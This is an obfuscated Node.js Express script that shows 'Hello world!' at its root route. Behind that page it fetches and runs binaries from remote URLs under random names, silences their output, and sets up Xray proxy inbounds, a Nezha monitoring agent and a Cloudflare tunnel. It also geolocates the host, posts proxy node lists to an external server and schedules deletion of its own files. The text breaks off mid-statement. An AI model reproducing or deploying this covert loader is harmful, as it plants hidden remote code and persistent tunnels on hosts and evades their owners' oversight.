const _0x1447d6=_0x3d97;(function(_0x4f11ff,_0x29fa83){const _0x44cae5={_0x3bac60:0x1e5,_0x37c827:0x29d,_0x1b2918:0x1f5,_0x35317d:0x208,_0x30a217:0x22c,_0x587420:0x27c,_0x5596b4:0x299,_0x1fa51a:0x1f8},_0x218df7=_0x3d97,_0x5e5842=_0x4f11ff();while(!![]){try{const _0x4ccbaf=-parseInt(_0x218df7(_0x44cae5._0x3bac60))/0x1*(parseInt(_0x218df7(_0x44cae5._0x37c827))/0x2)+-parseInt(_0x218df7(_0x44cae5._0x1b2918))/0x3*(-parseInt(_0x218df7(_0x44cae5._0x35317d))/0x4)+-parseInt(_0x218df7(_0x44cae5._0x30a217))/0x5+-parseInt(_0x218df7(0x21c))/0x6*(-parseInt(_0x218df7(_0x44cae5._0x587420))/0x7)+parseInt(_0x218df7(0x272))/0x8+parseInt(_0x218df7(_0x44cae5._0x5596b4))/0x9*(-parseInt(_0x218df7(0x1fe))/0xa)+parseInt(_0x218df7(_0x44cae5._0x1fa51a))/0xb*(-parseInt(_0x218df7(0x217))/0xc);if(_0x4ccbaf===_0x29fa83)break;else _0x5e5842['push'](_0x5e5842['shift']());}catch(_0x444ac4){_0x5e5842['push'](_0x5e5842['shift']());}}}(_0x5dd7,0x6dc59));const express=require(_0x1447d6(0x1fd)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x1447d6(0x258)),{promisify}=require(_0x1447d6(0x22f)),exec=promisify(require(_0x1447d6(0x28e))['exec']),{execSync}=require(_0x1447d6(0x28e)),UPLOAD_URL=process['env'][_0x1447d6(0x281)]||'',PROJECT_URL=process['env'][_0x1447d6(0x218)]||'',AUTO_ACCESS=process['env'][_0x1447d6(0x20f)]||![],FILE_PATH=process[_0x1447d6(0x1e8)]['FILE_PATH']||_0x1447d6(0x20d),SUB_PATH=process[_0x1447d6(0x1e8)][_0x1447d6(0x240)]||_0x1447d6(0x29a),PORT=process[_0x1447d6(0x1e8)]['SERVER_PORT']||process[_0x1447d6(0x1e8)]['PORT']||0xbb8,UUID=process[_0x1447d6(0x1e8)][_0x1447d6(0x244)]||'9afd1229-b893-40c1-84dd-51e7ce204913',NEZHA_SERVER=process['env'][_0x1447d6(0x26b)]||'',NEZHA_PORT=process['env'][_0x1447d6(0x260)]||'',NEZHA_KEY=process[_0x1447d6(0x1e8)][_0x1447d6(0x27d)]||'',ARGO_DOMAIN=process[_0x1447d6(0x1e8)][_0x1447d6(0x25c)]||_0x1447d6(0x27b),ARGO_AUTH=process[_0x1447d6(0x1e8)]['ARGO_AUTH']||_0x1447d6(0x280),ARGO_PORT=process[_0x1447d6(0x1e8)][_0x1447d6(0x247)]||0x26be,CFIP=process[_0x1447d6(0x1e8)]['CFIP']||_0x1447d6(0x27a),CFPORT=process[_0x1447d6(0x1e8)][_0x1447d6(0x1ea)]||0x1bb,NAME=process[_0x1447d6(0x1e8)][_0x1447d6(0x1e6)]||'dahuang';!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x1447d6(0x253)](FILE_PATH+_0x1447d6(0x29e))):console['log'](FILE_PATH+_0x1447d6(0x22e));function generateRandomName(){const _0x1c712f={_0x52e0d3:0x27f,_0x5eef41:0x26a,_0x2b0f12:0x29b,_0x207aef:0x282},_0x45a227=_0x1447d6,_0x872996=_0x45a227(_0x1c712f._0x52e0d3);let _0xba2c3e='';for(let _0x1a84c7=0x0;_0x1a84c7<0x6;_0x1a84c7++){_0xba2c3e+=_0x872996[_0x45a227(_0x1c712f._0x5eef41)](Math['floor'](Math[_0x45a227(_0x1c712f._0x2b0f12)]()*_0x872996[_0x45a227(_0x1c712f._0x207aef)]));}return _0xba2c3e;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x1447d6(0x266)](FILE_PATH,npmName),phpPath=path[_0x1447d6(0x266)](FILE_PATH,phpName),webPath=path[_0x1447d6(0x266)](FILE_PATH,webName),botPath=path[_0x1447d6(0x266)](FILE_PATH,botName),subPath=path[_0x1447d6(0x266)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x1447d6(0x213)),bootLogPath=path[_0x1447d6(0x266)](FILE_PATH,_0x1447d6(0x27e)),configPath=path['join'](FILE_PATH,_0x1447d6(0x206));function deleteNodes(){const _0x322b05={_0x45e79e:0x1e4,_0x1947d8:0x2a1,_0x3ff6cc:0x200,_0x1e06e8:0x292,_0x1460e3:0x28b,_0x2a5727:0x23f},_0x57850a=_0x1447d6;try{if(!UPLOAD_URL)return;if(!fs[_0x57850a(_0x322b05._0x45e79e)](subPath))return;let _0x1d70a0;try{_0x1d70a0=fs['readFileSync'](subPath,_0x57850a(_0x322b05._0x1947d8));}catch{return null;}const _0x428cfc=Buffer[_0x57850a(_0x322b05._0x3ff6cc)](_0x1d70a0,_0x57850a(0x226))[_0x57850a(_0x322b05._0x1e06e8)](_0x57850a(0x2a1)),_0xb8de6a=_0x428cfc[_0x57850a(_0x322b05._0x1460e3)]('\x0a')[_0x57850a(0x228)](_0x5316f1=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x57850a(0x227)](_0x5316f1));if(_0xb8de6a[_0x57850a(0x282)]===0x0)return;return axios[_0x57850a(0x1e9)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x57850a(0x2a4)]({'nodes':_0xb8de6a}),{'headers':{'Content-Type':_0x57850a(_0x322b05._0x2a5727)}})['catch'](_0x4e7ca1=>{return null;}),null;}catch(_0x429048){return null;}}function cleanupOldFiles(){const _0x26c93d={_0x362c7c:0x216};try{const _0x5d7963=fs['readdirSync'](FILE_PATH);_0x5d7963['forEach'](_0x558d33=>{const _0x3e6d3d=_0x3d97,_0x1825a3=path[_0x3e6d3d(0x266)](FILE_PATH,_0x558d33);try{const _0x85a5e5=fs[_0x3e6d3d(_0x26c93d._0x362c7c)](_0x1825a3);_0x85a5e5['isFile']()&&fs['unlinkSync'](_0x1825a3);}catch(_0x183482){}});}catch(_0x479c7d){}}app[_0x1447d6(0x236)]('/',function(_0x4d0a89,_0x589bcc){const _0x2983aa=_0x1447d6;_0x589bcc[_0x2983aa(0x1e7)]('Hello\x20world!');});async function generateConfig(){const _0x46ac69={_0x40c0ed:0x296,_0x167206:0x29f,_0x5980b0:0x22d,_0x41793a:0x24d,_0x545e81:0x26e,_0x1e8a74:0x224,_0xf50538:0x29f,_0x131b5a:0x239,_0x505441:0x241,_0x449bfd:0x26e,_0x4a456c:0x234,_0x3bc6d8:0x26e,_0x162bde:0x278,_0xc037f1:0x297},_0x20dd9e=_0x1447d6,_0x1a59e0={'log':{'access':_0x20dd9e(0x254),'error':_0x20dd9e(0x254),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x20dd9e(0x239),'settings':{'clients':[{'id':UUID,'flow':_0x20dd9e(_0x46ac69._0x40c0ed)}],'decryption':_0x20dd9e(_0x46ac69._0x167206),'fallbacks':[{'dest':0xbb9},{'path':_0x20dd9e(0x241),'dest':0xbba},{'path':_0x20dd9e(_0x46ac69._0x5980b0),'dest':0xbbb},{'path':_0x20dd9e(_0x46ac69._0x41793a),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x20dd9e(_0x46ac69._0x545e81),'protocol':_0x20dd9e(0x239),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x20dd9e(_0x46ac69._0x1e8a74),'security':_0x20dd9e(_0x46ac69._0xf50538)}},{'port':0xbba,'listen':_0x20dd9e(_0x46ac69._0x545e81),'protocol':_0x20dd9e(_0x46ac69._0x131b5a),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x20dd9e(0x29f)},'streamSettings':{'network':'ws','security':_0x20dd9e(_0x46ac69._0xf50538),'wsSettings':{'path':_0x20dd9e(_0x46ac69._0x505441)}},'sniffing':{'enabled':!![],'destOverride':[_0x20dd9e(0x25a),_0x20dd9e(0x264),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x20dd9e(_0x46ac69._0x449bfd),'protocol':_0x20dd9e(_0x46ac69._0x4a456c),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x20dd9e(0x22d)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x20dd9e(0x264),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x20dd9e(_0x46ac69._0x3bc6d8),'protocol':_0x20dd9e(0x286),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x20dd9e(0x24d)}},'sniffing':{'enabled':!![],'destOverride':[_0x20dd9e(0x25a),'tls',_0x20dd9e(0x21f)],'metadataOnly':![]}}],'dns':{'servers':[_0x20dd9e(_0x46ac69._0x162bde)]},'outbounds':[{'protocol':_0x20dd9e(0x25b),'tag':_0x20dd9e(0x252)},{'protocol':'blackhole','tag':'block'}]};fs[_0x20dd9e(_0x46ac69._0xc037f1)](path['join'](FILE_PATH,_0x20dd9e(0x206)),JSON[_0x20dd9e(0x2a4)](_0x1a59e0,null,0x2));}function getSystemArchitecture(){const _0x257ba0={_0x31f5bf:0x21b,_0x3c8c54:0x231,_0x47509c:0x23a},_0xd11e77=_0x1447d6,_0x3dca66=os[_0xd11e77(0x29c)]();return _0x3dca66===_0xd11e77(0x231)||_0x3dca66===_0xd11e77(_0x257ba0._0x31f5bf)||_0x3dca66===_0xd11e77(0x283)?_0xd11e77(_0x257ba0._0x3c8c54):_0xd11e77(_0x257ba0._0x47509c);}function downloadFile(_0x347b4c,_0x4040a9,_0x485069){const _0x262fc2={_0x2c6213:0x236,_0x4218a9:0x270,_0x1f8a47:0x23e},_0x336979={_0x264ae3:0x25f,_0x211d60:0x1ed,_0x4ea66:0x23b},_0x21379a={_0x4e93e9:0x28a,_0x28fa94:0x24c},_0x2cd178=_0x1447d6,_0x570fa2=_0x347b4c;!fs['existsSync'](FILE_PATH)&&fs[_0x2cd178(0x201)](FILE_PATH,{'recursive':!![]});const _0x19642e=fs[_0x2cd178(0x28f)](_0x570fa2);axios({'method':_0x2cd178(_0x262fc2._0x2c6213),'url':_0x4040a9,'responseType':_0x2cd178(_0x262fc2._0x4218a9)})[_0x2cd178(0x215)](_0x2daedd=>{const _0x5b6807={_0x538d69:0x1ed,_0x4b796a:0x212,_0x594273:0x26c},_0x3097d8={_0x2bcee1:0x253,_0x4f2ab9:0x221},_0x188073=_0x2cd178;_0x2daedd['data'][_0x188073(_0x21379a._0x4e93e9)](_0x19642e),_0x19642e['on'](_0x188073(_0x21379a._0x28fa94),()=>{const _0x2c4c5d=_0x188073;_0x19642e[_0x2c4c5d(0x256)](),console[_0x2c4c5d(_0x3097d8._0x2bcee1)]('Download\x20'+path[_0x2c4c5d(0x1ed)](_0x570fa2)+_0x2c4c5d(_0x3097d8._0x4f2ab9)),_0x485069(null,_0x570fa2);}),_0x19642e['on']('error',_0x532e34=>{const _0x57a029=_0x188073;fs[_0x57a029(0x28d)](_0x570fa2,()=>{});const _0x22ae65=_0x57a029(0x25f)+path[_0x57a029(_0x5b6807._0x538d69)](_0x570fa2)+_0x57a029(_0x5b6807._0x4b796a)+_0x532e34[_0x57a029(_0x5b6807._0x594273)];console[_0x57a029(0x23b)](_0x22ae65),_0x485069(_0x22ae65);});})[_0x2cd178(_0x262fc2._0x1f8a47)](_0x259610=>{const _0x411386=_0x2cd178,_0x10ab9a=_0x411386(_0x336979._0x264ae3)+path[_0x411386(_0x336979._0x211d60)](_0x570fa2)+_0x411386(0x212)+_0x259610[_0x411386(0x26c)];console[_0x411386(_0x336979._0x4ea66)](_0x10ab9a),_0x485069(_0x10ab9a);});}async function downloadFilesAndRun(){const _0x51e229={_0x5e6614:0x282,_0x41d0bd:0x253,_0x5e65ae:0x289,_0x486bf7:0x26d,_0x34f496:0x242,_0x5be2d3:0x2a3,_0xb18b64:0x273,_0x1391a0:0x22b,_0x35ea06:0x229,_0x22a72a:0x222,_0x1efe5d:0x23b,_0x497f97:0x1fb,_0x55138c:0x268,_0x5d279a:0x295,_0x3e8864:0x284,_0x25af46:0x237,_0x12bab3:0x222,_0x3b2430:0x23b,_0x5184b2:0x1e1,_0x19881a:0x211,_0x5d1516:0x290,_0x46dd88:0x257,_0xecb2fb:0x2a2,_0x11c944:0x257,_0x5f166d:0x1f6,_0x305bf2:0x298},_0x3500e0=_0x1447d6,_0x321c98=getSystemArchitecture(),_0x272390=getFilesForArchitecture(_0x321c98);if(_0x272390[_0x3500e0(_0x51e229._0x5e6614)]===0x0){console[_0x3500e0(_0x51e229._0x41d0bd)](_0x3500e0(_0x51e229._0x5e65ae));return;}const _0x303de6=_0x272390[_0x3500e0(_0x51e229._0x486bf7)](_0x346728=>{const _0x2c01da={_0x493554:0x1f0};return new Promise((_0x29467d,_0x4295ec)=>{const _0x4f3e84=_0x3d97;downloadFile(_0x346728['fileName'],_0x346728[_0x4f3e84(_0x2c01da._0x493554)],(_0x56b846,_0x5bba04)=>{_0x56b846?_0x4295ec(_0x56b846):_0x29467d(_0x5bba04);});});});try{await Promise[_0x3500e0(0x1ee)](_0x303de6);}catch(_0x1d9251){console[_0x3500e0(0x23b)](_0x3500e0(_0x51e229._0x34f496),_0x1d9251);return;}function _0x58bc07(_0x2fdece){const _0x33b55e={_0x13ac9d:0x1e4},_0x8497ca={_0x24c472:0x205},_0x5d0173=0x1fd;_0x2fdece['forEach'](_0x51bf2c=>{const _0x29b5c0=_0x3d97;fs[_0x29b5c0(_0x33b55e._0x13ac9d)](_0x51bf2c)&&fs[_0x29b5c0(0x22a)](_0x51bf2c,_0x5d0173,_0x4df97c=>{const _0x1106ab=_0x29b5c0;_0x4df97c?console[_0x1106ab(0x23b)](_0x1106ab(0x1f4)+_0x51bf2c+':\x20'+_0x4df97c):console[_0x1106ab(0x253)](_0x1106ab(_0x8497ca._0x24c472)+_0x51bf2c+':\x20'+_0x5d0173[_0x1106ab(0x292)](0x8));});});}const _0x2b683b=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x58bc07(_0x2b683b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x38ed1d=NEZHA_SERVER[_0x3500e0(0x262)](':')?NEZHA_SERVER[_0x3500e0(0x28b)](':')['pop']():'',_0x235976=new Set([_0x3500e0(0x268),_0x3500e0(_0x51e229._0x5be2d3),_0x3500e0(_0x51e229._0xb18b64),_0x3500e0(_0x51e229._0x1391a0),_0x3500e0(0x1e0),'2053']),_0x1c964b=_0x235976[_0x3500e0(0x20e)](_0x38ed1d)?_0x3500e0(_0x51e229._0x35ea06):_0x3500e0(0x1f2),_0x4c14fc=_0x3500e0(0x21e)+NEZHA_KEY+_0x3500e0(0x285)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x1c964b+_0x3500e0(0x1fc)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,'config.yaml'),_0x4c14fc);const _0x3f89d4='nohup\x20'+phpPath+_0x3500e0(0x277)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3f89d4),console[_0x3500e0(0x253)](phpName+_0x3500e0(_0x51e229._0x22a72a)),await new Promise(_0x32f3c4=>setTimeout(_0x32f3c4,0x3e8));}catch(_0x153e5e){console[_0x3500e0(_0x51e229._0x1efe5d)](_0x3500e0(_0x51e229._0x497f97)+_0x153e5e);}}else{let _0x1ec2df='';const _0x5e9165=[_0x3500e0(_0x51e229._0x55138c),_0x3500e0(0x2a3),_0x3500e0(0x273),_0x3500e0(_0x51e229._0x1391a0),_0x3500e0(0x1e0),_0x3500e0(_0x51e229._0x5d279a)];_0x5e9165[_0x3500e0(0x262)](NEZHA_PORT)&&(_0x1ec2df='--tls');const _0x42fb67=_0x3500e0(_0x51e229._0x3e8864)+npmPath+_0x3500e0(0x20a)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3500e0(_0x51e229._0x25af46)+NEZHA_KEY+'\x20'+_0x1ec2df+_0x3500e0(0x203);try{await exec(_0x42fb67),console['log'](npmName+_0x3500e0(_0x51e229._0x12bab3)),await new Promise(_0x36c5ca=>setTimeout(_0x36c5ca,0x3e8));}catch(_0xbf5e29){console[_0x3500e0(_0x51e229._0x3b2430)]('npm\x20running\x20error:\x20'+_0xbf5e29);}}}else console[_0x3500e0(0x253)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x3cbad7=_0x3500e0(0x284)+webPath+_0x3500e0(_0x51e229._0x5184b2)+FILE_PATH+_0x3500e0(_0x51e229._0x19881a);try{await exec(_0x3cbad7),console[_0x3500e0(0x253)](webName+_0x3500e0(_0x51e229._0x12bab3)),await new Promise(_0x3aab4e=>setTimeout(_0x3aab4e,0x3e8));}catch(_0x5bdd8a){console[_0x3500e0(0x23b)](_0x3500e0(_0x51e229._0x5d1516)+_0x5bdd8a);}if(fs['existsSync'](botPath)){let _0x360033;if(ARGO_AUTH[_0x3500e0(_0x51e229._0x46dd88)](/^[A-Z0-9a-z=]{120,250}$/))_0x360033=_0x3500e0(_0x51e229._0xecb2fb)+ARGO_AUTH;else ARGO_AUTH[_0x3500e0(_0x51e229._0x11c944)](/TunnelSecret/)?_0x360033=_0x3500e0(0x276)+FILE_PATH+_0x3500e0(_0x51e229._0x5f166d):_0x360033='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x3500e0(0x279)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x360033+_0x3500e0(_0x51e229._0x305bf2)),console['log'](botName+_0x3500e0(0x222)),await new Promise(_0x5cdcd7=>setTimeout(_0x5cdcd7,0x7d0));}catch(_0x69cb9f){console[_0x3500e0(0x23b)](_0x3500e0(0x24f)+_0x69cb9f);}}await new Promise(_0x1b4ae4=>setTimeout(_0x1b4ae4,0x1388));}function getFilesForArchitecture(_0x31ade5){const _0xb598f0={_0xfc1cf4:0x231,_0x4216ad:0x251,_0x42b3db:0x231},_0x428708=_0x1447d6;let _0x54ec5e;_0x31ade5===_0x428708(_0xb598f0._0xfc1cf4)?_0x54ec5e=[{'fileName':webPath,'fileUrl':_0x428708(0x246)},{'fileName':botPath,'fileUrl':_0x428708(0x259)}]:_0x54ec5e=[{'fileName':webPath,'fileUrl':_0x428708(0x243)},{'fileName':botPath,'fileUrl':_0x428708(0x232)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x57e073=_0x31ade5===_0x428708(_0xb598f0._0xfc1cf4)?'https://arm64.ssss.nyc.mn/agent':_0x428708(_0xb598f0._0x4216ad);_0x54ec5e[_0x428708(0x261)]({'fileName':npmPath,'fileUrl':_0x57e073});}else{const _0x3044ef=_0x31ade5===_0x428708(_0xb598f0._0x42b3db)?'https://arm64.ssss.nyc.mn/v1':_0x428708(0x1f9);_0x54ec5e['unshift']({'fileName':phpPath,'fileUrl':_0x3044ef});}}return _0x54ec5e;}function _0x3d97(_0x49909e,_0x30496e){const _0x5dd795=_0x5dd7();return _0x3d97=function(_0x3d9759,_0xbcba97){_0x3d9759=_0x3d9759-0x1e0;let _0x20e587=_0x5dd795[_0x3d9759];return _0x20e587;},_0x3d97(_0x49909e,_0x30496e);}function argoType(){const _0x12b0e0={_0x5acc4c:0x269,_0x592353:0x28b,_0x21e81e:0x20b,_0x569eb9:0x274,_0x27f8f5:0x1e3,_0x2443ba:0x297},_0x531955=_0x1447d6;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x531955(0x253)](_0x531955(0x238));return;}if(ARGO_AUTH[_0x531955(0x262)](_0x531955(0x21a))){fs['writeFileSync'](path[_0x531955(0x266)](FILE_PATH,_0x531955(0x274)),ARGO_AUTH);const _0xfb198a=_0x531955(_0x12b0e0._0x5acc4c)+ARGO_AUTH[_0x531955(_0x12b0e0._0x592353)]('\x22')[0xb]+_0x531955(_0x12b0e0._0x21e81e)+path[_0x531955(0x266)](FILE_PATH,_0x531955(_0x12b0e0._0x569eb9))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x531955(_0x12b0e0._0x27f8f5)+ARGO_PORT+_0x531955(0x1f7);fs[_0x531955(_0x12b0e0._0x2443ba)](path[_0x531955(0x266)](FILE_PATH,'tunnel.yml'),_0xfb198a);}else console[_0x531955(0x253)](_0x531955(0x209));}async function extractDomains(){const _0x2adb13={_0x43ae9a:0x287,_0x2af93a:0x266,_0x4de9cf:0x28c,_0x4f9c7d:0x253,_0x15a451:0x23b},_0xec8ee8={_0x532c93:0x2a5,_0x440777:0x1ff,_0x2b77bb:0x2a5,_0x385f1e:0x275,_0x647df0:0x2a5},_0x4e4fc8={_0x511a9c:0x255,_0x481139:0x294,_0x528c14:0x267},_0x5b7abb={_0x2d9458:0x257,_0x46b22e:0x225},_0x145265=_0x1447d6;let _0xc81c9b;if(ARGO_AUTH&&ARGO_DOMAIN)_0xc81c9b=ARGO_DOMAIN,console[_0x145265(0x253)](_0x145265(0x24b),_0xc81c9b),await _0x24b619(_0xc81c9b);else try{const _0x38bc0e=fs[_0x145265(0x1fa)](path['join'](FILE_PATH,'boot.log'),_0x145265(0x2a1)),_0x5d6fec=_0x38bc0e[_0x145265(0x28b)]('\x0a'),_0x413f19=[];_0x5d6fec[_0x145265(0x24a)](_0x2bc389=>{const _0x53fd4d=_0x145265,_0x13837f=_0x2bc389[_0x53fd4d(_0x5b7abb._0x2d9458)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x13837f){const _0x30f291=_0x13837f[0x1];_0x413f19[_0x53fd4d(_0x5b7abb._0x46b22e)](_0x30f291);}});if(_0x413f19[_0x145265(0x282)]>0x0)_0xc81c9b=_0x413f19[0x0],console[_0x145265(0x253)](_0x145265(0x20c),_0xc81c9b),await _0x24b619(_0xc81c9b);else{console[_0x145265(0x253)](_0x145265(_0x2adb13._0x43ae9a)),fs['unlinkSync'](path[_0x145265(_0x2adb13._0x2af93a)](FILE_PATH,'boot.log'));async function _0x59beb2(){const _0x473b77=_0x145265;try{process[_0x473b77(_0x4e4fc8._0x511a9c)]==='win32'?await exec(_0x473b77(_0x4e4fc8._0x481139)+botName+_0x473b77(_0x4e4fc8._0x528c14)):await exec(_0x473b77(0x210)+botName[_0x473b77(0x26a)](0x0)+']'+botName[_0x473b77(0x207)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x23d6cb){}}_0x59beb2(),await new Promise(_0x5e2375=>setTimeout(_0x5e2375,0xbb8));const _0x5818d7=_0x145265(_0x2adb13._0x4de9cf)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x145265(0x284)+botPath+'\x20'+_0x5818d7+_0x145265(0x298)),console[_0x145265(_0x2adb13._0x4f9c7d)](botName+_0x145265(0x222)),await new Promise(_0xaf1d6f=>setTimeout(_0xaf1d6f,0xbb8)),await extractDomains();}catch(_0x212c05){console[_0x145265(0x23b)]('Error\x20executing\x20command:\x20'+_0x212c05);}}}catch(_0x52ed0d){console[_0x145265(_0x2adb13._0x15a451)](_0x145265(0x2a0),_0x52ed0d);}async function _0x4c5929(){const _0x358283=_0x145265;try{const _0x53d453=await axios[_0x358283(0x236)](_0x358283(0x291),{'timeout':0xbb8});if(_0x53d453[_0x358283(0x2a5)]&&_0x53d453[_0x358283(_0xec8ee8._0x532c93)][_0x358283(0x1ff)]&&_0x53d453[_0x358283(0x2a5)][_0x358283(0x275)])return _0x53d453[_0x358283(0x2a5)][_0x358283(_0xec8ee8._0x440777)]+'_'+_0x53d453[_0x358283(_0xec8ee8._0x532c93)]['org'];}catch(_0x277cb0){try{const _0x409301=await axios['get'](_0x358283(0x233),{'timeout':0xbb8});if(_0x409301['data']&&_0x409301['data']['status']===_0x358283(0x2a6)&&_0x409301[_0x358283(0x2a5)][_0x358283(0x21d)]&&_0x409301[_0x358283(_0xec8ee8._0x2b77bb)][_0x358283(_0xec8ee8._0x385f1e)])return _0x409301[_0x358283(0x2a5)]['countryCode']+'_'+_0x409301[_0x358283(_0xec8ee8._0x647df0)][_0x358283(0x275)];}catch(_0x3dc066){}}return _0x358283(0x248);}async function _0x24b619(_0x5972eb){const _0x330c16=await _0x4c5929(),_0x2ff85f=NAME?NAME+'-'+_0x330c16:_0x330c16;return new Promise(_0x5648c9=>{const _0x274ccf={_0x32c017:0x29f,_0x2e7831:0x235,_0x22fdfd:0x24e,_0x165ced:0x250,_0x4ca29e:0x1e2,_0x1b71df:0x200,_0x1bd55a:0x1ef,_0x38dd32:0x245,_0x2fe299:0x253,_0x1fe383:0x226,_0x21b2b2:0x200,_0x34352b:0x292,_0x392f4d:0x226};setTimeout(()=>{const _0x101392={_0x5cfa69:0x200,_0x3898a5:0x292,_0x204e3c:0x23c,_0x3e3bce:0x25d},_0xcfe177=_0x3d97,_0x2620ed={'v':'2','ps':''+_0x2ff85f,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0xcfe177(_0x274ccf._0x32c017),'host':_0x5972eb,'path':_0xcfe177(0x271),'tls':'tls','sni':_0x5972eb,'alpn':'','fp':_0xcfe177(_0x274ccf._0x2e7831)},_0x24ef80=_0xcfe177(_0x274ccf._0x22fdfd)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x5972eb+_0xcfe177(_0x274ccf._0x165ced)+_0x5972eb+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x2ff85f+_0xcfe177(_0x274ccf._0x4ca29e)+Buffer[_0xcfe177(_0x274ccf._0x1b71df)](JSON[_0xcfe177(0x2a4)](_0x2620ed))['toString']('base64')+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0xcfe177(_0x274ccf._0x1bd55a)+_0x5972eb+_0xcfe177(_0x274ccf._0x165ced)+_0x5972eb+_0xcfe177(0x219)+_0x2ff85f+_0xcfe177(_0x274ccf._0x38dd32);console[_0xcfe177(_0x274ccf._0x2fe299)](Buffer[_0xcfe177(0x200)](_0x24ef80)['toString'](_0xcfe177(_0x274ccf._0x1fe383))),fs[_0xcfe177(0x297)](subPath,Buffer[_0xcfe177(_0x274ccf._0x21b2b2)](_0x24ef80)[_0xcfe177(_0x274ccf._0x34352b)](_0xcfe177(_0x274ccf._0x392f4d))),console[_0xcfe177(0x253)](FILE_PATH+_0xcfe177(0x230)),uploadNodes(),app[_0xcfe177(0x236)]('/'+SUB_PATH,(_0x570f60,_0x53d753)=>{const _0x540a8d=_0xcfe177,_0x10f75d=Buffer[_0x540a8d(_0x101392._0x5cfa69)](_0x24ef80)[_0x540a8d(_0x101392._0x3898a5)](_0x540a8d(0x226));_0x53d753[_0x540a8d(0x293)](_0x540a8d(_0x101392._0x204e3c),_0x540a8d(_0x101392._0x3e3bce)),_0x53d753[_0x540a8d(0x1e7)](_0x10f75d);}),_0x5648c9(_0x24ef80);},0x7d0);});}}async function uploadNodes(){const _0x3237c4={_0x1eddcd:0x1e9,_0x209d66:0x26f,_0x1b3984:0x253,_0x298090:0x1ec,_0x16c8fb:0x1e4,_0x2df88:0x1e9,_0xceeafd:0x23f,_0x5d1c83:0x26f,_0x28dc2b:0x263},_0x5ca2f8=_0x1447d6;if(UPLOAD_URL&&PROJECT_URL){const _0x40418d=PROJECT_URL+'/'+SUB_PATH,_0x117291={'subscription':[_0x40418d]};try{const _0x382249=await axios[_0x5ca2f8(_0x3237c4._0x1eddcd)](UPLOAD_URL+_0x5ca2f8(0x249),_0x117291,{'headers':{'Content-Type':_0x5ca2f8(0x23f)}});return _0x382249&&_0x382249[_0x5ca2f8(_0x3237c4._0x209d66)]===0xc8?(console[_0x5ca2f8(_0x3237c4._0x1b3984)](_0x5ca2f8(0x202)),_0x382249):null;}catch(_0x4b1aca){if(_0x4b1aca[_0x5ca2f8(_0x3237c4._0x298090)]){if(_0x4b1aca[_0x5ca2f8(_0x3237c4._0x298090)][_0x5ca2f8(_0x3237c4._0x209d66)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5ca2f8(_0x3237c4._0x16c8fb)](listPath))return;const _0x356b9e=fs['readFileSync'](listPath,_0x5ca2f8(0x2a1)),_0x29cf47=_0x356b9e['split']('\x0a')[_0x5ca2f8(0x228)](_0x40095e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5ca2f8(0x227)](_0x40095e));if(_0x29cf47[_0x5ca2f8(0x282)]===0x0)return;const _0x36699e=JSON[_0x5ca2f8(0x2a4)]({'nodes':_0x29cf47});try{const _0x1a0e9e=await axios[_0x5ca2f8(_0x3237c4._0x2df88)](UPLOAD_URL+'/api/add-nodes',_0x36699e,{'headers':{'Content-Type':_0x5ca2f8(_0x3237c4._0xceeafd)}});return _0x1a0e9e&&_0x1a0e9e[_0x5ca2f8(_0x3237c4._0x5d1c83)]===0xc8?(console[_0x5ca2f8(0x253)](_0x5ca2f8(_0x3237c4._0x28dc2b)),_0x1a0e9e):null;}catch(_0x1c2999){return null;}}else return;}}function cleanFiles(){const _0xc23b59={_0x4bdf12:0x225,_0x37cac5:0x1f3,_0x25f6d9:0x288},_0x20bb68={_0x1c0d07:0x220,_0x281e5a:0x253,_0x491f39:0x204};setTimeout(()=>{const _0x4204d1=_0x3d97,_0x20663e=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x20663e[_0x4204d1(0x225)](npmPath);else 